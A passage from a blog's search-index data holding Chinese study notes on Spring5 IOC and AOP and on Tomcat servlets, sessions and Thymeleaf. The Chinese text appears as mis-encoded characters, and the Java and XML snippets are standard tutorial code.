æ³¨å…¥å±æ€§æ³¨è§£ @Autowired //æ ¹æ®ç±»å‹è¿›è¡Œæ³¨å…¥ @Qualifier(value = \u0026#34;userDaoImpl1\u0026#34;) //æ ¹æ®åç§°è¿›è¡Œæ³¨å…¥ private UserDao userDao; @Resourceï¼šå¯ä»¥æ ¹æ®ç±»å‹æ³¨å…¥ï¼Œå¯ä»¥æ ¹æ®åç§°æ³¨å…¥\n1 2 3 4 //@Resource //æ ¹æ®ç±»å‹è¿›è¡Œæ³¨å…¥ @Resource(name = \u0026#34;userDaoImpl1\u0026#34;) private UserDao userDao; @Valueï¼šæ³¨å…¥æ™®é€šç±»å‹å±æ€§\n1 2 @Value(value = \u0026#34;abc\u0026#34;) private String name; 1.4 å®ç°IOCå®¹å™¨ä¸­å¯¹è±¡çš„è·å– xml\n1 2 3 ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\u0026#34;spring-config.xml\u0026#34;); Object obj = context.getBean(\u0026#34;obj\u0026#34;, Object.class); å…¨æ³¨è§£\nconfigå†™çš„æ˜¯å®ç°IOCæ‰«æçš„é…ç½®ç±» 1 2 3 ApplicationContext context = new AnnotationConfigApplicationContext(Config.class); Object obj = context.getBean(\u0026#34;obj\u0026#34;, Object.class); 0x02 Aop æ¦‚å¿µ é¢å‘åˆ‡é¢ï¼Œä¸ä¿®æ”¹æºä»£ç è¿›è¡ŒåŠŸèƒ½å¢å¼º é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ˆæ–¹é¢ï¼‰ï¼Œåˆ©ç”¨ AOP å¯ä»¥å¯¹ä¸šåŠ¡é€»è¾‘çš„å„ä¸ªéƒ¨åˆ†è¿›è¡Œéš”ç¦»ï¼Œä»è€Œä½¿å¾— ä¸šåŠ¡é€»è¾‘å„éƒ¨åˆ†ä¹‹é—´çš„è€¦åˆåº¦é™ä½ï¼Œæé«˜ç¨‹åºçš„å¯é‡ç”¨æ€§ï¼ŒåŒæ—¶æé«˜äº†å¼€å‘çš„æ•ˆç‡ã€‚ åº•å±‚åŸç† AOP åº•å±‚ä½¿ç”¨åŠ¨æ€ä»£ç† 2.1 åŠ¨æ€ä»£ç† ä½¿ç”¨æ–¹æ³•newProxyInstance\n1 2 3 4 5 6 7 8 9 10 11 12 13 public static Object newProxyInstance(ClassLoader loader, Class\u0026lt;?\u0026gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException Returns an instance of a proxy class for the specified interfaces that dispatches method invocations to the specified invocation handler. Proxy.newProxyInstance throws IllegalArgumentException for the same reasons that Proxy.getProxyClass does. Parameters: loader - the class loader to define the proxy class interfaces - the list of interfaces for the proxy class to implement h - the invocation handler to dispatch method invocations to Returns: a proxy instance with the specified invocation handler of a proxy class that is defined by the specified class loader and that implements the specified interfaces æ–¹æ³•æœ‰ä¸‰ä¸ªå‚æ•°ï¼š\nç¬¬ä¸€å‚æ•°ï¼Œç±»åŠ è½½å™¨ ç¬¬äºŒå‚æ•°ï¼Œå¢å¼ºæ–¹æ³•æ‰€åœ¨çš„ç±»ï¼Œè¿™ä¸ªç±»å®ç°çš„æ¥å£ï¼Œæ”¯æŒå¤šä¸ªæ¥å£ ç¬¬ä¸‰å‚æ•°ï¼Œå®ç°è¿™ä¸ªæ¥å£ InvocationHandlerï¼Œåˆ›å»ºä»£ç†å¯¹è±¡ï¼Œå†™å¢å¼ºçš„éƒ¨åˆ† å¤„ç†çš„å¢å¼ºç»“æœæ˜¯å€Ÿç”¨InvocationHandleræ¥å£çš„invokeæ–¹æ³•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class UserDaoProxy implements InvocationHandler{ private Object obj; public UserDaoProxy(Object obj) { this.obj = obj; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\u0026#34;å‘æ”¾ä¹‹å‰æ‰§è¡Œ....\u0026#34;+method.getName()+\u0026#34;å‚æ•°ï¼š\u0026#34;+ Arrays.toString(args)); Object res = method.invoke(obj,args); System.out.println(\u0026#34;æ–¹æ³•ä¹‹åæ‰§è¡Œ\u0026#34;); return res; } } 2.2 Aopæœ¯è¯­ è¿æ¥ç‚¹\nç±»é‡Œé¢å“ªäº›æ–¹æ³•å¯ä»¥è¢«å¢å¼ºï¼Œå±äºè¿æ¥ç‚¹ åˆ‡å…¥ç‚¹\nå®é™…è¢«å¢å¼ºçš„æ–¹æ³•ï¼Œæˆä¸ºåˆ‡å…¥ç‚¹\nè¡¨è¾¾å¼\n1 2 3 4 5 6 7 8 9 10 11 execution([æƒé™ä¿®é¥°ç¬¦] [è¿”å›ç±»å‹] [ç±»å…¨è·¯å¾„] [æ–¹æ³•åç§°]([å‚æ•°åˆ—è¡¨]) ) ä¸¾ä¾‹ 1ï¼šå¯¹ com.atguigu.dao.BookDao ç±»é‡Œé¢çš„ add è¿›è¡Œå¢å¼º execution(* com.atguigu.dao.BookDao.add(..)) ä¸¾ä¾‹ 2ï¼šå¯¹ com.atguigu.dao.BookDao ç±»é‡Œé¢çš„æ‰€æœ‰çš„æ–¹æ³•è¿›è¡Œå¢å¼º execution(* com.atguigu.dao.BookDao.* (..)) ä¸¾ä¾‹ 3ï¼šå¯¹ com.atguigu.dao åŒ…é‡Œé¢æ‰€æœ‰ç±»ï¼Œç±»é‡Œé¢æ‰€æœ‰æ–¹æ³•è¿›è¡Œå¢å¼º execution(* com.atguigu.dao.*.* (..)) ç›¸åŒçš„åˆ‡å…¥ç‚¹å¯ä»¥ä½¿ç”¨@Pointcutè¿›è¡Œæ³¨å†ŒåŒä¸€ä¸ªè·¯å¾„\n1 2 3 4 5 6 7 8 @Pointcut(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void pointdemo() { } //å‰ç½®é€šçŸ¥ //@Before æ³¨è§£è¡¨ç¤ºä½œä¸ºå‰ç½®é€šçŸ¥ @Before(value = \u0026#34;pointdemo()\u0026#34;) public void before() { System.out.println(\u0026#34;before.........\u0026#34;); } é€šçŸ¥ï¼ˆå¢å¼ºï¼‰\nå®é™…å¢å¼ºçš„é€»è¾‘éƒ¨åˆ† é€šçŸ¥çš„ç±»å‹ å‰ç½®é€šçŸ¥:Before åç½®é€šçŸ¥:AfterReturning ç¯ç»•é€šçŸ¥:Around å¼‚å¸¸é€šçŸ¥:AfterThrowing æœ€ç»ˆé€šçŸ¥:After 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 @Component @Aspect //ç”Ÿæˆä»£ç†å¯¹è±¡ public class UserProxy { //å‰ç½®é€šçŸ¥ //@Before æ³¨è§£è¡¨ç¤ºä½œä¸ºå‰ç½®é€šçŸ¥ @Before(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void before() { System.out.println(\u0026#34;before.........\u0026#34;); } //åç½®é€šçŸ¥ï¼ˆè¿”å›é€šçŸ¥ï¼‰ @AfterReturning(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void afterReturning() { System.out.println(\u0026#34;afterReturning.........\u0026#34;); } //æœ€ç»ˆé€šçŸ¥ @After(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void after() { System.out.println(\u0026#34;after.........\u0026#34;); } //å¼‚å¸¸é€šçŸ¥ @AfterThrowing(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void afterThrowing() { System.out.println(\u0026#34;afterThrowing.........\u0026#34;); } //ç¯ç»•é€šçŸ¥ @Around(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void around(ProceedingJoinPoint proceedingJoinPoint) throws Throwable { System.out.println(\u0026#34;ç¯ç»•ä¹‹å‰.........\u0026#34;); //è¢«å¢å¼ºçš„æ–¹æ³•æ‰§è¡Œ proceedingJoinPoint.proceed(); System.out.println(\u0026#34;ç¯ç»•ä¹‹å.........\u0026#34;); } } åˆ‡é¢\nåŠ¨ä½œï¼Œè¿‡ç¨‹ å®ç°å¢å¼ºçš„è¿‡ç¨‹ä»£ç  å®ç°è¿‡ç¨‹\nå¯¹ä½¿ç”¨çš„ç±»è¦è¿›è¡Œç»„ä»¶æ³¨å†Œï¼Œä½¿ç”¨iocæ³¨å†Œï¼Œå¢å¼ºç±»ç”¨Aspect\néœ€è¦å¼€å¯å…¨å±€ä»£ç†\nxml\n1 2 3 \u0026lt;!-- å¼€å¯ Aspect ç”Ÿæˆä»£ç†å¯¹è±¡--\u0026gt; \u0026lt;aop:aspectj-autoproxy\u0026gt;\u0026lt;/aop:aspectj-autoproxy\u0026gt; å®Œå…¨æ³¨è§£\n1 2 3 4 @Configuration @ComponentScan(basePackages = {\u0026#34;com.atguigu\u0026#34;}) @EnableAspectJAutoProxy(proxyTargetClass = true) public class ConfigAop { } @Orderå¯ä»¥è®¾ç½®ä¼˜å…ˆçº§ï¼Œæ•°å­—è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ã€‚\n","permalink":"http://www.reus09.top/posts/tech/spring/","summary":"Spring5 æ¡†æ¶ è¿™é‡Œä¸»è¦å­¦ä¹ äº†Spring5çš„ç›¸å…³çŸ¥è¯†ï¼Œå¯¹iocå’ŒAopçš„ç›¸å…³çŸ¥è¯†è¿›è¡Œæ•´ç† 0x01 IOC æ¦‚å¿µ æ§åˆ¶åè½¬ï¼ŒæŠŠåˆ›å»ºå¯¹è±¡è¿‡ç¨‹äº¤ç»™ Spring è¿›è¡Œç®¡ç† ä½¿ç”¨ç›®çš„ï¼š ä¸ºäº†","title":"Spring"},{"content":"0x01 Tomcatä½¿ç”¨ 1.1 Tomcatè®¾ç½®ç¼–ç  Tomcatè®¾ç½®ç¼–ç \ntomcat8ä¹‹å‰ï¼Œè®¾ç½®ç¼–ç ï¼š\ngetè¯·æ±‚æ–¹å¼ï¼š getæ–¹å¼ç›®å‰ä¸éœ€è¦è®¾ç½®ç¼–ç ï¼ˆåŸºäºtomcat8ï¼‰\nå¦‚æœæ˜¯getè¯·æ±‚å‘é€çš„ä¸­æ–‡æ•°æ®ï¼Œè½¬ç ç¨å¾®æœ‰ç‚¹éº»çƒ¦ï¼ˆtomcat8ä¹‹å‰ï¼‰\n1 2 3 4 5 String fname = request.getParameter(\u0026#34;fname\u0026#34;); //1.å°†å­—ç¬¦ä¸²æ‰“æ•£æˆå­—èŠ‚æ•°ç»„ byte[] bytes = fname.getBytes(\u0026#34;ISO-8859-1\u0026#34;); //2.å°†å­—èŠ‚æ•°ç»„æŒ‰ç…§è®¾å®šçš„ç¼–ç é‡æ–°ç»„è£…æˆå­—ç¬¦ä¸² fname = new String(bytes,\u0026#34;UTF-8\u0026#34;); postè¯·æ±‚æ–¹å¼ï¼š request.setCharacterEncoding(\u0026quot;UTF-8\u0026quot;);\ntomcat8å¼€å§‹ï¼Œè®¾ç½®ç¼–ç ï¼Œåªéœ€è¦é’ˆå¯¹postæ–¹å¼ request.setCharacterEncoding(\u0026quot;UTF-8\u0026quot;);\næ³¨æ„ï¼š\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè®¾ç½®ç¼–ç (post)è¿™ä¸€å¥ä»£ç å¿…é¡»åœ¨æ‰€æœ‰çš„è·å–å‚æ•°åŠ¨ä½œä¹‹å‰ 1.2 Servlet 1.2.1 ç»§æ‰¿å…³ç³» Servletçš„ç»§æ‰¿å…³ç³» - é‡ç‚¹æŸ¥çœ‹çš„æ˜¯æœåŠ¡æ–¹æ³•ï¼ˆservice()ï¼‰\nç»§æ‰¿å…³ç³» javax.servlet.Servletæ¥å£ javax.servlet.GenericServletæŠ½è±¡ç±» javax.servlet.http.HttpServletæŠ½è±¡å­ç±»\nç›¸å…³æ–¹æ³•\njavax.servlet.Servletæ¥å£:\n1 2 3 void init(config) - åˆå§‹åŒ–æ–¹æ³• void service(request,response) - æœåŠ¡æ–¹æ³• void destory() - é”€æ¯æ–¹æ³• javax.servlet.GenericServletæŠ½è±¡ç±»ï¼š\n1 void service(request,response) - ä»ç„¶æ˜¯æŠ½è±¡çš„ javax.servlet.http.HttpServlet æŠ½è±¡å­ç±»ï¼š\n1 void service(request,response) - ä¸æ˜¯æŠ½è±¡çš„ String method = req.getMethod(); è·å–è¯·æ±‚çš„æ–¹å¼\nåœ¨HttpServletè¿™ä¸ªæŠ½è±¡ç±»ä¸­ï¼Œdoæ–¹æ³•éƒ½å·®ä¸å¤š:\n1 2 3 4 5 6 7 8 9 protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String protocol = req.getProtocol(); String msg = lStrings.getString(\u0026#34;http.method_get_not_supported\u0026#34;); if (protocol.endsWith(\u0026#34;1.1\u0026#34;)) { resp.sendError(405, msg); } else { resp.sendError(400, msg); } } å°ç»“ï¼š\nç»§æ‰¿å…³ç³»ï¼š HttpServlet -\u0026gt; GenericServlet -\u0026gt; Servlet Servletä¸­çš„æ ¸å¿ƒæ–¹æ³•ï¼š init() , service() , destroy() æœåŠ¡æ–¹æ³•ï¼š å½“æœ‰è¯·æ±‚è¿‡æ¥æ—¶ï¼Œserviceæ–¹æ³•ä¼šè‡ªåŠ¨å“åº”ï¼ˆå…¶å®æ˜¯tomcatå®¹å™¨è°ƒç”¨çš„ï¼‰ åœ¨HttpServletä¸­æˆ‘ä»¬ä¼šå»åˆ†æè¯·æ±‚çš„æ–¹å¼ï¼šåˆ°åº•æ˜¯getã€postã€headè¿˜æ˜¯deleteç­‰ ç„¶åå†å†³å®šè°ƒç”¨çš„æ˜¯å“ªä¸ªdoå¼€å¤´çš„æ–¹æ³• é‚£ä¹ˆåœ¨HttpServletä¸­è¿™äº›doæ–¹æ³•é»˜è®¤éƒ½æ˜¯405çš„å®ç°é£æ ¼-è¦æˆ‘ä»¬å­ç±»å»å®ç°å¯¹åº”çš„æ–¹æ³•ï¼Œå¦åˆ™é»˜è®¤ä¼šæŠ¥405é”™è¯¯ å› æ­¤ï¼Œæˆ‘ä»¬åœ¨æ–°å»ºServletæ—¶ï¼Œæˆ‘ä»¬æ‰ä¼šå»è€ƒè™‘è¯·æ±‚æ–¹æ³•ï¼Œä»è€Œå†³å®šé‡å†™å“ªä¸ªdoæ–¹æ³• 1.2.2 ç”Ÿå‘½å‘¨æœŸ Servletçš„ç”Ÿå‘½å‘¨æœŸ\nç”Ÿå‘½å‘¨æœŸï¼šä»å‡ºç”Ÿåˆ°æ­»äº¡çš„è¿‡ç¨‹å°±æ˜¯ç”Ÿå‘½å‘¨æœŸã€‚å¯¹åº”Servletä¸­çš„ä¸‰ä¸ªæ–¹æ³•ï¼šinit(),service(),destroy()\né»˜è®¤æƒ…å†µä¸‹ï¼š\nç¬¬ä¸€æ¬¡æ¥æ”¶è¯·æ±‚æ—¶ï¼Œè¿™ä¸ªServletä¼šè¿›è¡Œå®ä¾‹åŒ–(è°ƒç”¨æ„é€ æ–¹æ³•)ã€åˆå§‹åŒ–(è°ƒç”¨init())ã€ç„¶åæœåŠ¡(è°ƒç”¨service()) ä»ç¬¬äºŒæ¬¡è¯·æ±‚å¼€å§‹ï¼Œæ¯ä¸€æ¬¡éƒ½æ˜¯æœåŠ¡ å½“å®¹å™¨å…³é—­æ—¶ï¼Œå…¶ä¸­çš„æ‰€æœ‰çš„servletå®ä¾‹ä¼šè¢«é”€æ¯ï¼Œè°ƒç”¨é”€æ¯æ–¹æ³• é€šè¿‡æ¡ˆä¾‹æˆ‘ä»¬å‘ç°ï¼š\nServletå®ä¾‹tomcatåªä¼šåˆ›å»ºä¸€ä¸ªï¼Œæ‰€æœ‰çš„è¯·æ±‚éƒ½æ˜¯è¿™ä¸ªå®ä¾‹å»å“åº”ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶ï¼Œtomcatæ‰ä¼šå»å®ä¾‹åŒ–ï¼Œåˆå§‹åŒ–ï¼Œç„¶åå†æœåŠ¡.è¿™æ ·çš„å¥½å¤„æ˜¯æé«˜ç³»ç»Ÿçš„å¯åŠ¨é€Ÿåº¦ ã€‚ è¿™æ ·çš„ç¼ºç‚¹æ˜¯ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶ï¼Œè€—æ—¶è¾ƒé•¿ã€‚ å› æ­¤å¾—å‡ºç»“è®ºï¼š å¦‚æœéœ€è¦æé«˜ç³»ç»Ÿçš„å¯åŠ¨é€Ÿåº¦ï¼Œå½“å‰é»˜è®¤æƒ…å†µå°±æ˜¯è¿™æ ·ã€‚å¦‚æœéœ€è¦æé«˜å“åº”é€Ÿåº¦ï¼Œæˆ‘ä»¬åº”è¯¥è®¾ç½®Servletçš„åˆå§‹åŒ–æ—¶æœºã€‚ Servletåœ¨å®¹å™¨ä¸­æ˜¯ï¼šå•ä¾‹çš„ã€çº¿ç¨‹ä¸å®‰å…¨çš„\nå•ä¾‹ï¼šæ‰€æœ‰çš„è¯·æ±‚éƒ½æ˜¯åŒä¸€ä¸ªå®ä¾‹å»å“åº” çº¿ç¨‹ä¸å®‰å…¨ï¼šä¸€ä¸ªçº¿ç¨‹éœ€è¦æ ¹æ®è¿™ä¸ªå®ä¾‹ä¸­çš„æŸä¸ªæˆå‘˜å˜é‡å€¼å»åšé€»è¾‘åˆ¤æ–­ã€‚ä½†æ˜¯åœ¨ä¸­é—´æŸä¸ªæ—¶æœºï¼Œå¦ä¸€ä¸ªçº¿ç¨‹æ”¹å˜äº†è¿™ä¸ªæˆå‘˜å˜é‡çš„å€¼ï¼Œä»è€Œå¯¼è‡´ç¬¬ä¸€ä¸ªçº¿ç¨‹çš„æ‰§è¡Œè·¯å¾„å‘ç”Ÿäº†å˜åŒ– æˆ‘ä»¬å·²ç»çŸ¥é“äº†servletæ˜¯çº¿ç¨‹ä¸å®‰å…¨çš„ï¼Œç»™æˆ‘ä»¬çš„å¯å‘æ˜¯ï¼š å°½é‡çš„ä¸è¦åœ¨servletä¸­å®šä¹‰æˆå‘˜å˜é‡ã€‚å¦‚æœä¸å¾—ä¸å®šä¹‰æˆå‘˜å˜é‡ï¼Œé‚£ä¹ˆä¸è¦å»ï¼šâ‘ ä¸è¦å»ä¿®æ”¹æˆå‘˜å˜é‡çš„å€¼ â‘¡ä¸è¦å»æ ¹æ®æˆå‘˜å˜é‡çš„å€¼åšä¸€äº›é€»è¾‘åˆ¤æ–­ 1.2.3 session ä¼šè¯\nHttpæ˜¯æ— çŠ¶æ€çš„\nHTTP æ— çŠ¶æ€ ï¼šæœåŠ¡å™¨æ— æ³•åˆ¤æ–­è¿™ä¸¤æ¬¡è¯·æ±‚æ˜¯åŒä¸€ä¸ªå®¢æˆ·ç«¯å‘è¿‡æ¥çš„ï¼Œè¿˜æ˜¯ä¸åŒçš„å®¢æˆ·ç«¯å‘è¿‡æ¥çš„\næ— çŠ¶æ€å¸¦æ¥çš„ç°å®é—®é¢˜ï¼šå¯¹äºå¤šæ¬¡è¯·æ±‚æ— æ³•ç¡®å®šæ˜¯ä¸€ä¸ªåŒä¸€ä¸ªç”¨æˆ·å‘é€ï¼Œä»è€Œå¢åŠ æœåŠ¡å™¨è´Ÿè½½ã€‚\né€šè¿‡ä¼šè¯è·Ÿè¸ªæŠ€æœ¯æ¥è§£å†³æ— çŠ¶æ€çš„é—®é¢˜ã€‚\nä¼šè¯è·Ÿè¸ªæŠ€æœ¯\nå®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡å‘è¯·æ±‚ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è·å–sessionï¼Œè·å–ä¸åˆ°ï¼Œåˆ™åˆ›å»ºæ–°çš„ï¼Œç„¶åå“åº”ç»™å®¢æˆ·ç«¯\nä¸‹æ¬¡å®¢æˆ·ç«¯ç»™æœåŠ¡å™¨å‘è¯·æ±‚æ—¶ï¼Œä¼šæŠŠsessionIDå¸¦ç»™æœåŠ¡å™¨ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±èƒ½è·å–åˆ°äº†ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±åˆ¤æ–­è¿™ä¸€æ¬¡è¯·æ±‚å’Œä¸Šæ¬¡æŸæ¬¡è¯·æ±‚æ˜¯åŒä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œä»è€Œèƒ½å¤ŸåŒºåˆ†å¼€å®¢æˆ·ç«¯\nå¸¸ç”¨çš„APIï¼š\n1 2 3 4 5 6 7 8 9 request.getSession() -\u0026gt; è·å–å½“å‰çš„ä¼šè¯ï¼Œæ²¡æœ‰åˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„ä¼šè¯ request.getSession(true) -\u0026gt; æ•ˆæœå’Œä¸å¸¦å‚æ•°ç›¸åŒ request.getSession(false) -\u0026gt; è·å–å½“å‰ä¼šè¯ï¼Œæ²¡æœ‰åˆ™è¿”å›nullï¼Œä¸ä¼šåˆ›å»ºæ–°çš„ session.getId() -\u0026gt; è·å–sessionID session.isNew() -\u0026gt; åˆ¤æ–­å½“å‰sessionæ˜¯å¦æ˜¯æ–°çš„ session.getMaxInactiveInterval() -\u0026gt; sessionçš„éæ¿€æ´»é—´éš”æ—¶é•¿ï¼Œé»˜è®¤1800ç§’ session.setMaxInactiveInterval() session.invalidate() -\u0026gt; å¼ºåˆ¶æ€§è®©ä¼šè¯ç«‹å³å¤±æ•ˆ sessionä¿å­˜ä½œç”¨åŸŸ\nsessionä¿å­˜ä½œç”¨åŸŸæ˜¯å’Œå…·ä½“çš„æŸä¸€ä¸ªsessionå¯¹åº”çš„\nå¸¸ç”¨çš„APIï¼š\n1 2 3 void session.setAttribute(k,v) Object session.getAttribute(k) void removeAttribute(k) ä½œç”¨åŸŸæ¯”è¾ƒï¼š\nåŸå§‹æƒ…å†µä¸‹ï¼Œä¿å­˜ä½œç”¨åŸŸæˆ‘ä»¬å¯ä»¥è®¤ä¸ºæœ‰å››ä¸ªï¼š pageï¼ˆé¡µé¢çº§åˆ«ï¼Œç°åœ¨å‡ ä¹ä¸ç”¨ï¼‰ , requestï¼ˆä¸€æ¬¡è¯·æ±‚å“åº”èŒƒå›´ï¼‰ , sessionï¼ˆä¸€æ¬¡ä¼šè¯èŒƒå›´ï¼‰ , applicationï¼ˆæ•´ä¸ªåº”ç”¨ç¨‹åºèŒƒå›´ï¼‰ requestï¼šä¸€æ¬¡è¯·æ±‚å“åº”èŒƒå›´ sessionï¼šä¸€æ¬¡ä¼šè¯èŒƒå›´æœ‰æ•ˆ applicationï¼š ä¸€æ¬¡åº”ç”¨ç¨‹åºèŒƒå›´æœ‰æ•ˆ 1.2.4 ç½‘é¡µè·³è½¬ æœåŠ¡å™¨å†…éƒ¨è½¬å‘ä»¥åŠå®¢æˆ·ç«¯é‡å®šå‘ æœåŠ¡å™¨å†…éƒ¨è½¬å‘ : request.getRequestDispatcher(\u0026quot;...\u0026quot;).forward(request,response); ä¸€æ¬¡è¯·æ±‚å“åº”çš„è¿‡ç¨‹ï¼Œå¯¹äºå®¢æˆ·ç«¯è€Œè¨€ï¼Œå†…éƒ¨ç»è¿‡äº†å¤šå°‘æ¬¡è½¬å‘ï¼Œå®¢æˆ·ç«¯æ˜¯ä¸çŸ¥é“çš„ åœ°å€æ æ²¡æœ‰å˜åŒ– å®¢æˆ·ç«¯é‡å®šå‘ï¼š response.sendRedirect(\u0026quot;....\u0026quot;); ä¸¤æ¬¡è¯·æ±‚å“åº”çš„è¿‡ç¨‹ã€‚å®¢æˆ·ç«¯è‚¯å®šçŸ¥é“è¯·æ±‚URLæœ‰å˜åŒ– åœ°å€æ æœ‰å˜åŒ– 1.2.5 å¯¹åº”ç½‘ç«™routeè®¾ç½® å¯ä»¥åœ¨web.xmlé‡Œé¢é…ç½®Servlet\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;Demo01Servlet\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.reus.Demo01Servlet\u0026lt;/servlet-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;hello\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;world\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;Demo01Servlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/demo01\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; å¯ä»¥é€šè¿‡æ³¨è§£çš„æ–¹å¼è¿›è¡Œé…ç½®\n1 2 3 4 @WebServlet(urlPatterns = {\u0026#34;/demo01\u0026#34;} , initParams = { @WebInitParam(name=\u0026#34;hello\u0026#34;,value=\u0026#34;world\u0026#34;) }) è¿™ç”¨Demo01Servelet.javaå¯¹åº”çš„serviceå°†å¯¹åº”ç½‘é¡µçš„routeä¸º/demo01\nè·å–ServletContextï¼Œæœ‰å¾ˆå¤šæ–¹æ³•\nåœ¨åˆå§‹åŒ–æ–¹æ³•ä¸­ï¼š ServletContxt servletContext = getServletContext()\nåœ¨æœåŠ¡æ–¹æ³•ä¸­ä¹Ÿå¯ä»¥é€šè¿‡requestå¯¹è±¡è·å–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡sessionè·å–ï¼š request.getServletContext(); session.getServletContext()\nè·å–åˆå§‹åŒ–å€¼ï¼š\nservletContext.getInitParameter(); 1.3 Thymeleafè§†å›¾æŠ€æœ¯ Thymeleaf - è§†å›¾æ¨¡æ¿æŠ€æœ¯\næ·»åŠ thymeleafçš„jaråŒ… æ–°å»ºä¸€ä¸ªServletç±»ViewBaseServlet åœ¨web.xmlæ–‡ä»¶ä¸­æ·»åŠ é…ç½® é…ç½®å‰ç¼€ view-prefix é…ç½®åç¼€ view-suffix ä½¿å¾—æˆ‘ä»¬çš„Servletç»§æ‰¿ViewBaseServlet æ ¹æ®é€»è¾‘è§†å›¾åç§° å¾—åˆ° ç‰©ç†è§†å›¾åç§° æ­¤å¤„çš„è§†å›¾åç§°æ˜¯ index\né‚£ä¹ˆthymeleafä¼šå°†è¿™ä¸ª é€»è¾‘è§†å›¾åç§° å¯¹åº”åˆ° ç‰©ç†è§†å›¾ åç§°ä¸Šå»\né€»è¾‘è§†å›¾åç§° ï¼š index\nç‰©ç†è§†å›¾åç§° ï¼š view-prefix + é€»è¾‘è§†å›¾åç§° + view-suffix\næ‰€ä»¥çœŸå®çš„è§†å›¾åç§°æ˜¯ï¼š / index .html super.processTemplate(\u0026quot;index\u0026quot;,request,response);\nä½¿ç”¨thymeleafçš„æ ‡ç­¾\n1 th:if , th:unless , th:each , th:text , th:src\t,\tth:value th:href 0x02 myssm 2.1 BaseDAO è¿™é‡Œè§å¦ä¸€åšå®¢ JDBC BaseDAOæŠ½è±¡äº†åŸºç¡€çš„å¢åˆ æ”¹æŸ¥æ“ä½œAPI 2.2 IOC IOC\nè€¦åˆ/ä¾èµ–\nIOC - æ§åˆ¶åè½¬ / DI - ä¾èµ–æ³¨å…¥\næ§åˆ¶åè½¬ï¼š\nä¹‹å‰åœ¨Servletä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºserviceå¯¹è±¡ ï¼Œ FruitService fruitService = new FruitServiceImpl(); è¿™å¥è¯å¦‚æœå‡ºç°åœ¨servletä¸­çš„æŸä¸ªæ–¹æ³•å†…éƒ¨ï¼Œé‚£ä¹ˆè¿™ä¸ªfruitServiceçš„ä½œç”¨åŸŸï¼ˆç”Ÿå‘½å‘¨æœŸï¼‰åº”è¯¥å°±æ˜¯è¿™ä¸ªæ–¹æ³•çº§åˆ«ï¼› å¦‚æœè¿™å¥è¯å‡ºç°åœ¨servletçš„ç±»ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´fruitServiceæ˜¯ä¸€ä¸ªæˆå‘˜å˜é‡ï¼Œé‚£ä¹ˆè¿™ä¸ªfruitServiceçš„ä½œç”¨åŸŸï¼ˆç”Ÿå‘½å‘¨æœŸï¼‰åº”è¯¥å°±æ˜¯è¿™ä¸ªservletå®ä¾‹çº§åˆ« ä¹‹åæˆ‘ä»¬åœ¨applicationContext.xmlä¸­å®šä¹‰äº†è¿™ä¸ªfruitServiceã€‚ç„¶åé€šè¿‡è§£æXMLï¼Œäº§ç”ŸfruitServiceå®ä¾‹ï¼Œå­˜æ”¾åœ¨beanMapä¸­ï¼Œè¿™ä¸ªbeanMapåœ¨ä¸€ä¸ªBeanFactoryä¸­ å› æ­¤ï¼Œæˆ‘ä»¬è½¬ç§»ï¼ˆæ”¹å˜ï¼‰äº†ä¹‹å‰çš„serviceå®ä¾‹ã€daoå®ä¾‹ç­‰ç­‰ä»–ä»¬çš„ç”Ÿå‘½å‘¨æœŸã€‚æ§åˆ¶æƒä»ç¨‹åºå‘˜è½¬ç§»åˆ°BeanFactoryã€‚è¿™ä¸ªç°è±¡æˆ‘ä»¬ç§°ä¹‹ä¸ºæ§åˆ¶åè½¬ ä¾èµ–æ³¨å…¥ï¼š\nä¹‹å‰æˆ‘ä»¬åœ¨æ§åˆ¶å±‚å‡ºç°ä»£ç ï¼šFruitService fruitService = new FruitServiceImpl()ï¼› é‚£ä¹ˆï¼Œæ§åˆ¶å±‚å’Œserviceå±‚å­˜åœ¨è€¦åˆã€‚\nä¹‹åï¼Œæˆ‘ä»¬å°†ä»£ç ä¿®æ”¹æˆFruitService fruitService = null ; ç„¶åï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®:\n1 2 3 \u0026lt;bean id=\u0026#34;fruit\u0026#34; class=\u0026#34;FruitController\u0026#34;\u0026gt; \u0026lt;property 